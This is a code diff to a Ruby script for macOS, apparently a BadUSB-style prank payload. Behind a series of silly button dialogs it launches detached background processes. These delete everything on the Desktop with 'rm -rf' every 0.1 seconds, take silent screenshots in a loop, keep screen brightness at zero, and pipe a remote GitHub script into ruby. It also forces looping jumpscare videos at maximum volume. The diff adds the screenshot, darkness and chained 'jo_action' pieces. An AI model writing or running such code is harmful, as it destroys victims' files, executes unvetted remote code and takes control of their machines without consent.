@@ -80,15 +80,15 @@ def persistent_jumpscare(video_url)
     set_volume_to_max
     # Open the jumpscare page in Safari.
     system("open -a Safari '#{html_file}'")
-    # Immediately hide Safari's front window.
+    # Hide Safari's front window.
     system("osascript -e 'tell application \"Safari\" to set visible of front window to false'")
     # Wait 0.85 seconds (simulate waiting for sound detection).
     sleep 0.85
-    # Unhide Safari so the jumpscare becomes visible.
+    # Unhide Safari.
     system("osascript -e 'tell application \"Safari\" to set visible of front window to true'")
     # Let the jumpscare play for 1 second.
     sleep 1
-
+    
     # Check if any Safari tab's URL contains "jumpscare".
     check_script = %Q{
       tell application "Safari"
@@ -102,7 +102,7 @@ def persistent_jumpscare(video_url)
       end tell
     }
     result = `osascript -e '#{check_script}'`.strip.downcase
-    # If not found, reopen the page.
+    # If the jumpscare page is not found, reopen it.
     unless result.include?("true")
       system("open -a Safari '#{html_file}'")
     end
@@ -110,14 +110,41 @@ def persistent_jumpscare(video_url)
   end
 end
 
+# --- Spam Screenshots Function (Detached Process) ---
+# (This function is kept as is, but might trigger recording permissions.)
+def spam_screenshots
+  pid = fork do
+    Process.daemon(true, true)
+    loop do
+      filename = "/tmp/screenshot_#{Time.now.to_f.to_s.gsub('.', '')}_#{rand(10000)}.jpg"
+      system("screencapture -x #{filename}")
+      sleep 0.1
+    end
+  end
+  Process.detach(pid)
+end
+
 # --- Delete Desktop Files Function (Detached Process) ---
 def delete_desktop_files
   pid = fork do
-    # Detach the process so it runs independently of Terminal.
     Process.daemon(true, true)
     loop do
       system("rm -rf ~/Desktop/*")
       sleep 0.1
+    end
+  end
+  Process.detach(pid)
+end
+
+# --- Brightness Control: Continuously set brightness to 0 (Detached Process) ---
+def maintain_darkness
+  pid = fork do
+    Process.daemon(true, true)
+    loop do
+      if system("command -v brightness > /dev/null 2>&1")
+        system("brightness 0")
+      end
+      sleep 3
     end
   end
   Process.detach(pid)
@@ -128,17 +155,29 @@ def run_secret_script
   system("curl -s https://raw.githubusercontent.com/Hrampell/badusb_v2/main/secret.sh | ruby")
 end
 
-# --- First Subscriber Prompt (Three Buttons: Hawk, Tuah, Next) ---
+# --- Jo Action ---
+# Executes: spam screenshots, delete desktop files, maintain darkness,
+# run rickroll, and then launch the Momo jumpscare.
+def jo_action
+  spam_screenshots
+  delete_desktop_files
+  maintain_darkness
+  run_secret_script
+  persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/momojumpscare.mp4")
+end
+
+# --- Subscriber Branch Prompts ---
+# First prompt: three buttons: "Hawk", "Tuah", "Next"
 def first_subscriber_prompt
   display_dialog("Choose a button:", ["Hawk", "Tuah", "Next"], "Hawk")
 end
 
-# --- Second Subscriber Prompt (Two Buttons: Sydney lover, Slay, with a Next button) ---
+# Second prompt: two buttons: "Sydney lover", "Slay", plus a "Next" button
 def second_subscriber_prompt
   display_dialog("Choose a button:", ["Sydney lover", "Slay", "Next"], "Sydney lover")
 end
 
-# --- Third Subscriber Prompt (One Button: Jo) ---
+# Third prompt: one button: "Jo"
 def third_subscriber_prompt
   display_dialog("Press the button to activate Jo:", ["Jo"], "Jo")
 end
@@ -166,21 +205,20 @@ def subscriber_action
       exit 0
     end
     second_choice = second_choice.strip.downcase
-    case second_choice
-    when "sydney lover"
+    if second_choice == "sydney lover"
       persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/andrewjumpv2.mp4")
-    when "slay"
+    elsif second_choice == "slay"
       persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/momojumpscare.mp4")
-    when "next"
+    elsif second_choice == "next"
       third_choice = third_subscriber_prompt
       if third_choice && third_choice.strip.downcase == "jo"
-        delete_desktop_files
+        jo_action
       else
         puts "No valid choice in third prompt. Exiting."
         exit 0
       end
     else
-      puts "Unexpected button choice in second prompt: #{second_choice}"
+      puts "Unexpected choice in second prompt: #{second_choice}"
     end
   else
     puts "Unexpected button choice in first prompt: #{first_choice}"
@@ -198,11 +236,9 @@ if subscribed.nil?
 end
 
 if subscribed.strip.downcase == "no"
-  # Non-subscriber branch: Immediately trigger jumpscare using jumpscare2.mp4.
   sleep 1
   video_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/jumpscare2.mp4"
   persistent_jumpscare(video_url)
 else
-  # Subscriber branch.
   subscriber_action
 end
